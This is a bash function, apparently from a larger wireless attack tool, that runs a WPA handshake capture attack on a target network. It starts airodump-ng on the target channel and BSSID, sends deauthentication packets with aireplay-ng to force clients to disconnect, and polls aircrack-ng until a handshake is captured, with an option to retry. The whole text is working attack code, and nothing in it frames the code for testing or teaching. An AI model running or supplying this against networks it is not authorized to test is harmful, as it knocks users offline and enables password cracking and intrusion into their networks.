# Handshake Capture Attack Functions

capture_handshake() {
    log_info "Starting WPA handshake capture attack on $TARGET_ESSID..."
    
    HANDSHAKE_FILE="$OUTPUT_DIR/${TARGET_ESSID//[^a-zA-Z0-9]/_}"
    
    # Remove old capture files for this target
    rm -f "${HANDSHAKE_FILE}"*.cap 2>/dev/null
    rm -f "${HANDSHAKE_FILE}"*.csv 2>/dev/null
    rm -f "${HANDSHAKE_FILE}"*.netxml 2>/dev/null
    
    log_info "Starting capture on channel $TARGET_CHANNEL..."
    
    # Start airodump-ng to capture handshake
    airodump-ng -c "$TARGET_CHANNEL" --bssid "$TARGET_BSSID" -w "$HANDSHAKE_FILE" "$MONITOR_INTERFACE" &
    local airodump_pid=$!
    
    sleep 3
    
    # Send deauth packets
    log_info "Sending $DEAUTH_COUNT deauthentication packets..."
    aireplay-ng --deauth "$DEAUTH_COUNT" -a "$TARGET_BSSID" "$MONITOR_INTERFACE" > /dev/null 2>&1 &
    local aireplay_pid=$!
    
    log_info "Waiting for handshake capture (timeout: ${CAPTURE_DURATION}s)..."
    log_warning "This may take a while if there are no connected clients"
    
    # Monitor for handshake
    local elapsed=0
    local handshake_captured=false
    
    while [ $elapsed -lt $CAPTURE_DURATION ]; do
        sleep 5
        ((elapsed+=5))
        
        # Check if handshake was captured
        local cap_file=$(ls "${HANDSHAKE_FILE}"-*.cap 2>/dev/null | head -1)
        if [ -n "$cap_file" ]; then
            if aircrack-ng "$cap_file" 2>/dev/null | grep -qi "1 handshake"; then
                handshake_captured=true
                break
            fi
        fi
        
        echo -n "."
    done
    
    echo ""
    
    # Stop capture processes
    kill $airodump_pid 2>/dev/null || true
    kill $aireplay_pid 2>/dev/null || true
    wait $airodump_pid 2>/dev/null || true
    wait $aireplay_pid 2>/dev/null || true
    
    if [ "$handshake_captured" = true ]; then
        log_success "Handshake captured successfully!"
        
        # Find the .cap file
        local cap_file=$(ls "${HANDSHAKE_FILE}"-*.cap 2>/dev/null | head -1)
        if [ -n "$cap_file" ]; then
            log_success "Handshake file: $cap_file"
        fi
    else
        log_error "Failed to capture handshake"
        log_warning "This could mean:"
        log_warning "  - No clients are connected to the target network"
        log_warning "  - Client didn't reconnect during capture window"
        log_warning "  - Network is not vulnerable to deauth attacks"
        
        read -p "Retry capture? (y/n): " retry
        if [ "$retry" = "y" ] || [ "$retry" = "Y" ]; then
            capture_handshake
        else
            cleanup_and_exit
        fi
    fi
}
